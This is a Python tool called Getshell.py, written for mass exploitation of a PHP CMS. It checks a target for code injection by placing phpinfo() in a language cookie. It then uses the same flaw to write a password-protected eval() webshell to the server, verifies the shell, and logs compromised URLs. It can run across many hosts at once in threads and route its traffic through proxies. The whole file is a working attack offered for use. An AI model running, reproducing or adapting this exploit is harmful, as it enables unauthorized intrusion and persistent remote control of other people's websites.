#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Author   :wjlin0
# @Blog     :https://wjlin0.com
# @Email    :wjlgeren@163.com
# @Time     :2022-01-08 21:28
# @File     :Getshell.py
import argparse
import os
import re
import socket
import sys
import threading
import time
import requests
import socks
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
timeout = 10
types = ["HTTP", "SOCKS4", "SOCKS5"]
threads = []
Dir = os.path.abspath(os.path.dirname(__file__))
outfile = ''


def print_f():
    print("""
     __      __   __.__  .__       _______    
    /  \\    /  \\ |__|  | |__| ____ \\   _  \\   
    \\   \\/\\/   / |  |  | |  |/    \\/  /_\\  \\  
     \\        /  |  |  |_|  |   |  \\  \\_/   \\ 
      \\__/\\  /\\__|  |____/__|___|  /\\_____  / 
           \\/\\______|            \\/       \\/ 
        """)
    print("""
     __      __   __.__  .__       _______    
    /  \\    /  \\ |__|  | |__| ____ \\   _  \\   
    \\   \\/\\/   / |  |  | |  |/    \\/  /_\\  \\  
     \\        /  |  |  |_|  |   |  \\  \\_/   \\ 
      \\__/\\  /\\__|  |____/__|___|  /\\_____  / 
           \\/\\______|            \\/       \\/ 
        """)
    print("\n\n\n\n")


def get_var():
    global args, outfile
    parser = argparse.ArgumentParser(description="getshell")
    parser.add_argument("-u", "--url", help="含有漏洞的网站url")
    parser.add_argument("-n", "--name", help="一句话木马文件名称,默认shell.php")
    parser.add_argument("-p", "--passwd", help="一句话木马密码,默认cdu")
    parser.add_argument("--proxy", help="--proxy=(http|socks4|socks5)://address:port")
    parser.add_argument("--proxy_cred", help="--proxy-cred=username:password")
    parser.add_argument("-f", "--file", help="输入多个ip的文件")
    parser.add_argument("-o", "--outfile", help="输出的文件")
    args = parser.parse_args()
    # 获取代理
    if args.proxy is not None:
        if args.proxy is not None:
            proxy_type = (''.join(re.findall(r"(.*?)\:\/\/", args.proxy))).upper()
            # 判断用户输入正确
            if proxy_type not in types:
                sys.exit(f"proxy_type is erro\n")
            else:
                # 获取用户输入的ip、port
                proxy_ip = ''.join(re.findall(r"\/\/(.*?)\:", args.proxy))
                proxy_port = int(''.join(re.findall("\/\/.*\:(.*)", args.proxy)))
            # 获取代理类型
            if proxy_type == "HTTP":
                proxy_type = socks.HTTP
            elif proxy_type == "SOCKS5":
                proxy_type = socks.SOCKS5
            elif proxy_type == "SOCKS4":
                proxy_type = socks.SOCKS4
            # 是否存在验证
            if args.proxy_cred is not None:
                proxy_user = ''.join(re.findall(r"(.*?)\:", args.proxy_cred))
                proxy_passwd = ''.join(re.findall(r"\:(.*)", args.proxy_cred))
            else:
                proxy_user = ''
                proxy_passwd = ''

            socks.set_default_proxy(proxy_type=proxy_type, addr=proxy_ip, port=proxy_port, username=proxy_user,
                                    password=proxy_passwd)
            socket.socket = socks.socksocket
            # 验证代理是否正确
            html = requests.get(url="http://ifconfig.me/ip", verify=False, timeout=timeout)
            if html.status_code != 200:
                print("[-]代理有问题请重新选择，或不适用代理")
                exit()
    # 获取输出文件位置
    # print(args.outfile)
    if args.outfile is None:
        if not os.path.exists(Dir + "/output"):
            os.mkdir(Dir + "/output")
        outfile = Dir + "/output/" + str(time.strftime("%Y-%m-%d-%H", time.localtime(time.time()))) + ".txt"
    elif args.outfile is not None:
        outfile = args.outfile


def Runs(r_url):
    try:
        c = Cms(r_url)
        c.run()
    except Exception as e:
        print("erro:", e)


class Cms:
    def __init__(self, url):
        self.passwords = 'cdu'
        self.cookies = {}
        self.hs = {
            "user-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
                          "Chrome/90.0.4430.212 Safari/537.36"
        }
        self.lang_name = ''
        self.url = url
        self.password = args.passwd
        self.name = args.name
        self.exp_url = ''

    def get_name_url_passwd(self):
        if self.name is None:
            self.name = 'shell.php'
        if self.password is None:
            self.password = 'cdu'
            self.exp_url = '/'.join(self.url.strip().split('/')[0:-1]) + f'/{self.name}'

    def systeminfo(self):
        html = requests.get(self.url, verify=False, timeout=timeout)
        for ce in html.cookies:
            if 'language' in ce.name:
                self.cookies[ce.name] = '\'.phpinfo().\''
                self.lang_name = ce.name
            else:
                self.cookies[ce.name] = ce.value
        # self.hs['cookie'] = self.cookies

    def yanzheng(self):
        html = requests.get(url=self.url, cookies=self.cookies, verify=False, timeout=timeout)
        html.encoding = html.apparent_encoding
        if 'PHP Version' in html.text.encode("utf-8").decode():
            print(f"[+]该存在漏洞,{self.url}")
            return True
        else:
            print(f"[-]该不存在漏洞,{self.url}")
            return False

    def liyong(self):

        self.cookies[self.lang_name] = f'%27.file_put_contents%28%27{self.name}%27%2Curldecode%28%27%253C%253Fphp' \
                                       f'%2Beval%2528%2524_%2550%254F%2553%2554%255B{self.password}%255D%2529%253B%2B' \
                                       f'%253F%253E' \
                                       f'%27%29%29.%27 '

        html = requests.get(url=self.url, cookies=self.cookies, verify=False, timeout=timeout)
        data = {self.password: "phpinfo();"}
        html2 = requests.post(url=self.exp_url, data=data)
        html2.encoding = html2.apparent_encoding
        if 'PHP Version' in html2.text.encode("utf-8").decode():
            print(f"[+]木马写入成功漏洞,{self.exp_url}")
            return True
        else:
            print(f"[-]木马写入失败,但该漏洞存在可进行网站访问查看详细信息,{self.url}")
            return False

    def info(self, T, T1=False):
        if T:
            if T1:
                with open(outfile, "a+")as f2:
                    f2.write(f"url={self.exp_url}\n")
            elif not T1:
                with open(outfile, "a+")as f3:
                    f3.write(f"存在漏洞但未写入木马,url={self.url}\n")

    def run(self):
        self.get_name_url_passwd()
        self.systeminfo()
        T = self.yanzheng()
        if T:
            T1 = self.liyong()
            self.info(T, T1)
        else:
            self.info(T)


if __name__ == '__main__':
    print_f()
    get_var()
    if args.url is None:
        if args.file is not None:
            with open(args.file, "r")as f:
                ips = f.readlines()
        for ip in ips:
            ip = ip.strip("\n")
            t = threading.Thread(target=Runs, args=(ip,))
            threads.append(t)
        for t in threads:
            t.setDaemon(True)
            t.start()
        for t in threads:
            t.join()
    elif args.url is not None:
        url = args.url
        Runs(url)
